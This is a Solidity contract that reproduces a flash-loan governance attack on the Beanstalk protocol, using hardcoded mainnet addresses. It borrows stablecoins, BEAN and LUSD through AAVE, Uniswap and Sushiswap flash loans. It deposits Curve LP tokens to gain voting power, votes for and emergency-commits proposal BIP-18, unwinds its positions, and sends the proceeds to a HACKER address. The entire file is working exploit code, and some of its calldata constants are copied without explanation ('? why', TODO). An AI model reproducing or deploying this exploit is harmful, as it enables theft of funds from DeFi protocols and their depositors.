// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IBeanstalk.sol";

import "../interfaces/IUSDT.sol";
import "../interfaces/IWETH9.sol";
import "../interfaces/IERC20.sol";
import "../interfaces/IUniswapV2/IUniswapV2Pair.sol";
import "../interfaces/IUniswapV3/IUniswapV3Pair.sol";
import "../interfaces/IUniswapV2/IUniswapV2Callee.sol";
import "../interfaces/IUniswapV3/IUniswapV3Callee.sol";
import "../interfaces/AAVEv2/ILendingPool.sol";

contract BeanstalkAttack {
    constructor() {
        BeanstalkAttackInner inner = new BeanstalkAttackInner();
        inner.attack();
    }
}

contract BeanstalkAttackInner is IUniswapV2Callee, IUniswapV3Callee {
    address private constant HACKER = 0x1c5dCdd006EA78a7E4783f9e6021C32935a10fb4;

    address private constant BEAN = 0xDC59ac4FeFa32293A95889Dc396682858d52e5Db;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant _3CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address private constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant CURVE_3POOL_DEPOSIT_ZAP =
        0xA79828DF1850E8a3A3064576f380D90aECDD3359;
    address private constant CURVE_3POOL =
        0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address private constant LUSD_3CRV_POOL =
        0xEd279fDD11cA84bEef15AF5D39BB4d4bEE23F0cA; // LUSD3CRV-f
    address private constant BEAN_3CRV_POOL =
        0x3a70DfA7d2262988064A2D051dd47521E43c9BdD; // BEAN3CRV-f
    address private constant BEAN_LUSD_POOL =
        0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D; // BEANLUSD-f
    address private constant BEANSTALK =
        0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5; // BeanStalk protocol
    address private constant AAVEV2 =
        0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9; // AAVEv2
    address private constant UNISWAP_WETH_BEAN_PAIR =
        0x87898263B6C5BABe34b4ec53F22d98430b91e371; // Uniswap WETH-BEAN pair
    address private constant SUSHISWAP_LUSD_OHM_POOL =
        0x46E4D8A1322B9448905225E52F914094dBd6dDdF; // Sushiswap LUSD-OHM pool
    address private constant DONATION_WALLET = 
        0x165CD37b4C644C2921454429E7F9358d18A45e14; // donation wallet
    address private constant UNISWAPV3_DAI_USDC_PAIR = 
        0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168; // Uniswap v3 DAI-USDC pair
    address private constant UNISWAPV3_USDC_WETH_PAIR =
        0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640; // Uniswap v3 USDC-WETH pair
    address private constant UNISWAPV3_WETH_USDT_PAIR =
        0x4e68Ccd3E89f51C3074ca5072bbAC773960dFa36; // Uniswap v3 WETH-USDT pair
 
    constructor() {
        uint256 maxApprove = type(uint256).max - 1;

        IERC20(BEAN).approve(CURVE_3POOL_DEPOSIT_ZAP, maxApprove);
        IERC20(USDC).approve(CURVE_3POOL_DEPOSIT_ZAP, maxApprove);
        IERC20(DAI).approve(CURVE_3POOL_DEPOSIT_ZAP, maxApprove);
        IUSDT(USDT).approve(CURVE_3POOL_DEPOSIT_ZAP, maxApprove);

        IERC20(USDC).approve(CURVE_3POOL, maxApprove);
        IERC20(DAI).approve(CURVE_3POOL, maxApprove);
        IUSDT(USDT).approve(CURVE_3POOL, maxApprove);

        IERC20(_3CRV).approve(LUSD_3CRV_POOL, maxApprove);
        IERC20(LUSD).approve(LUSD_3CRV_POOL, maxApprove);

        IERC20(BEAN).approve(BEAN_3CRV_POOL, maxApprove);
        IERC20(_3CRV).approve(BEAN_3CRV_POOL, maxApprove);

        IERC20(BEAN).approve(BEAN_LUSD_POOL, maxApprove);
        IERC20(LUSD).approve(BEAN_LUSD_POOL, maxApprove);

        IERC20(USDC).approve(BEANSTALK, maxApprove);
        IERC20(BEAN_3CRV_POOL).approve(BEANSTALK, maxApprove);
        IERC20(BEAN_LUSD_POOL).approve(BEANSTALK, maxApprove);
        IERC20(BEAN).approve(BEANSTALK, maxApprove);

        IERC20(USDC).approve(AAVEV2, maxApprove);
        IERC20(DAI).approve(AAVEV2, maxApprove);
        IUSDT(USDT).approve(AAVEV2, maxApprove);
    }

    // instead of 0x726e04f6 selector
    function attack() external {
        address[] memory tokens = new address[](3);
        tokens[0] = DAI;
        tokens[1] = USDC;
        tokens[2] = USDT;

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 350000000000000000000000000; // 350,000,000 DAI = 35%
        amounts[1] = 500000000000000; // 500,000,000 USDC = 50%
        amounts[2] = 150000000000000; // 150,000,000 USDT = 15%

        uint256[] memory modes = new uint256[](3);
        modes[0] = 0;
        modes[1] = 0;
        modes[2] = 0;

        // AAVE v2 flashloan DAI, USDC, USDT
        ILendingPool(AAVEV2).flashLoan(
            address(this),
            tokens,
            amounts,
            modes,
            address(this),
            "",
            0
        );

        // Removing liquidity from WETH-BEAN pool
        IERC20(UNISWAP_WETH_BEAN_PAIR).transfer(
            UNISWAP_WETH_BEAN_PAIR,
            IERC20(UNISWAP_WETH_BEAN_PAIR).balanceOf(address(this))
        );
        IUniswapV2Pair(UNISWAP_WETH_BEAN_PAIR).burn(address(this));

        // Donate 250k USDC
        IERC20(USDC).transfer(DONATION_WALLET, 250000000000);

        // Swap DAI -> USDC
        IUniswapV3Pair(UNISWAPV3_DAI_USDC_PAIR).swap(
            address(this),
            true, // DAI -> USDC
            int(IERC20(DAI).balanceOf(address(this))),
            4295128740, // ? why
            hex"0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f0000000000000000000000000000000000000000000cc631f3a7bb36f02541e9" // TODO
        );

        // Swap USDC -> WETH
        IUniswapV3Pair(UNISWAPV3_USDC_WETH_PAIR).swap(
            address(this),
            true,
            int(IERC20(USDC).balanceOf(address(this))),
            4295128740, // ? why
            hex"000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000000000000021dbf7b26f9c" // TODO
        );

        // Swap USDT -> WETH
        IUniswapV3Pair(UNISWAPV3_WETH_USDT_PAIR).swap(
            address(this),
            false,
            int(IERC20(USDT).balanceOf(address(this))),
            1461446703485210000000000000000000000000000000000,
            hex"000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000060009b2ff48"
        );

        // Unwrap WETH
        IWETH9(WETH).withdraw(IERC20(WETH).balanceOf(address(this)));

        // Withdraw ETH
        payable(HACKER).transfer(address(this).balance);
    }

    // UniswapV3 swap callback
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        // TODO
        if (keccak256(data) == keccak256(hex"0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f0000000000000000000000000000000000000000000cc631f3a7bb36f02541e9")) {
            IERC20(DAI).transfer(UNISWAPV3_DAI_USDC_PAIR, uint256(amount0Delta));
        // TODO
        } else if (keccak256(data) == keccak256(hex"000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000000000000021dbf7b26f9c")) {
            IERC20(USDC).transfer(UNISWAPV3_USDC_WETH_PAIR, uint256(amount0Delta));
        // TODO
        } else if (keccak256(data) == keccak256(hex"000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000060009b2ff48")) {
            IUSDT(USDT).transfer(UNISWAPV3_WETH_USDT_PAIR, uint256(amount1Delta));
        }
    }

    // AAVE v2 flashloan callback
    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata,
        address,
        bytes calldata
    ) external returns (bool) {
        // Uniswap v2 flashloan BEAN from WETH-BEAN pool
        IUniswapV2Pair(UNISWAP_WETH_BEAN_PAIR).swap(
            0,
            IERC20(BEAN).balanceOf(UNISWAP_WETH_BEAN_PAIR) * 99 / 100,
            address(this),
            abi.encode(BEAN)
        );

        bool result;

        // Swap LUSD -> 3CRV
        (result, ) = LUSD_3CRV_POOL.call(
            abi.encodeWithSignature(
                "exchange(int128,int128,uint256,uint256)",
                0,
                1,
                IERC20(LUSD).balanceOf(address(this)),
                0
            )
        );
        require(result, "LUSD_3CRV_POOL exchange failed");

        uint256 _3crvBalance = IERC20(_3CRV).balanceOf(address(this));

        // Remove USDC liquidity from 3pool
        (result, ) = CURVE_3POOL.call(
            abi.encodeWithSignature(
                "remove_liquidity_one_coin(uint256,int128,uint256)",
                _3crvBalance * 50 / 100,
                1,
                0
            )
        );
        require(result, "CURVE_3POOL remove_liquidity_one_coin USDC failed");

        // Remove DAI liquidity from 3pool
        (result, ) = CURVE_3POOL.call(
            abi.encodeWithSignature(
                "remove_liquidity_one_coin(uint256,int128,uint256)",
                _3crvBalance * 35 / 100,
                0,
                0
            )
        );
        require(result, "CURVE_3POOL remove_liquidity_one_coin DAI failed");

        // Remove USDT liquidity from 3pool
        (result, ) = CURVE_3POOL.call(
            abi.encodeWithSignature(
                "remove_liquidity_one_coin(uint256,int128,uint256)",
                _3crvBalance * 15 / 100,
                2,
                0
            )
        );
        require(result, "CURVE_3POOL remove_liquidity_one_coin USDT failed");

        require(
            IERC20(DAI).balanceOf(address(this)) > amounts[0] &&
            IERC20(USDC).balanceOf(address(this)) > amounts[1] &&
            IERC20(USDT).balanceOf(address(this)) > amounts[2],
            "No profit"
        );

        return true;
    }

    // Uniswap v2 swap callback
    function uniswapV2Call(
        address,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        address decodedData = abi.decode(data, (address));

        // Flashloan BEAN
        if (BEAN == decodedData) {
            _beanUniswapFlashloanCallback(amount1);
        } 
        // Flashloan LUSD
        else if (LUSD == decodedData) {
            _lusdSushiswapFlashloanCallback(amount0);
        }
    }

    function _beanUniswapFlashloanCallback(uint256 beanAmount) internal {
        // Uniswap flashloan LUSD from Sushiswap LUSD-OHM pool
        IUniswapV2Pair(SUSHISWAP_LUSD_OHM_POOL).swap(
            IERC20(LUSD).balanceOf(SUSHISWAP_LUSD_OHM_POOL) * 99 / 100,
            0,
            address(this),
            abi.encode(LUSD)
        );

        // Repay BEAN flashloan
        IERC20(BEAN).transfer(
            UNISWAP_WETH_BEAN_PAIR,
            ((beanAmount * 1000) / 997) + 1
        );
    }

    function _lusdSushiswapFlashloanCallback(uint256 lusdAmount) internal {
        bool result;

        // Adding liquidity to 3pool with DAI, USDC, USDT
        (result, ) = CURVE_3POOL.call(
            abi.encodeWithSignature(
                "add_liquidity(uint256[3],uint256)",
                [
                    IERC20(DAI).balanceOf(address(this)), 
                    IERC20(USDC).balanceOf(address(this)), 
                    IERC20(USDT).balanceOf(address(this))
                ],
                0
            )
        );
        require(result, "CURVE_3POOL add_liquidity failed");

        // Swap 3CRV -> LUSD
        (result, ) = LUSD_3CRV_POOL.call(
            abi.encodeWithSignature(
                "exchange(int128,int128,uint256,uint256)",
                1,
                0,
                15000000000000000000000000, // why?
                0
            )
        );
        require(result, "LUSD_3CRV_POOL exchange failed");

        // Adding liquidity to BEAN-3CRV pool
        (result, ) = BEAN_3CRV_POOL.call(
            abi.encodeWithSignature(
                "add_liquidity(uint256[2],uint256)",
                [
                    0, 
                    IERC20(_3CRV).balanceOf(address(this))
                ],
                0
            )
        );
        require(result, "BEAN_3CRV_POOL add_liquidity failed");

        // Adding liquidity to BEAN-LUSD pool
        (result, ) = BEAN_LUSD_POOL.call(
            abi.encodeWithSignature(
                "add_liquidity(uint256[2],uint256)",
                [
                    IERC20(BEAN).balanceOf(address(this)),
                    IERC20(LUSD).balanceOf(address(this))
                ],
                1650198257 // why?
            )
        );
        require(result, "BEAN_LUSD_POOL add_liquidity failed");

        // Deposit BEAN-3CRV LP to Beanstalk
        IBeanstalk(BEANSTALK).deposit(
            BEAN_3CRV_POOL,
            IERC20(BEAN_3CRV_POOL).balanceOf(address(this))
        );

        // Deposit BEAN-LUSD LP to Beanstalk
        IBeanstalk(BEANSTALK).deposit(
            BEAN_LUSD_POOL,
            IERC20(BEAN_LUSD_POOL).balanceOf(address(this))
        );

        // Vote for attacker proposal BIP-18
        IBeanstalk(BEANSTALK).vote(18);
        // Emergency commit proposal BIP-18 (the attack)
        IBeanstalk(BEANSTALK).emergencyCommit(18);

        // Remove BEAN-3CRV LP
        (result, ) = BEAN_3CRV_POOL.call(
            abi.encodeWithSignature(
                "remove_liquidity_one_coin(uint256,int128,uint256)",
                IERC20(BEAN_3CRV_POOL).balanceOf(address(this)),
                1,
                0
            )
        );
        require(result, "BEAN_3CRV_POOL remove_liquidity_one_coin failed");

        // Remove BEAN-LUSD LP
        (result, ) = BEAN_LUSD_POOL.call(
            abi.encodeWithSignature(
                "remove_liquidity_one_coin(uint256,int128,uint256)",
                IERC20(BEAN_LUSD_POOL).balanceOf(address(this)),
                1,
                0
            )
        );
        require(result, "BEAN_LUSD_POOL remove_liquidity_one_coin failed");

        // Repay LUSD flashloan
        IERC20(LUSD).transfer(
            SUSHISWAP_LUSD_OHM_POOL,
            ((lusdAmount * 1000) / 997) + 1
        );
    }

    // To receive withdrawn ETH from WETH
    receive() external payable {}
}
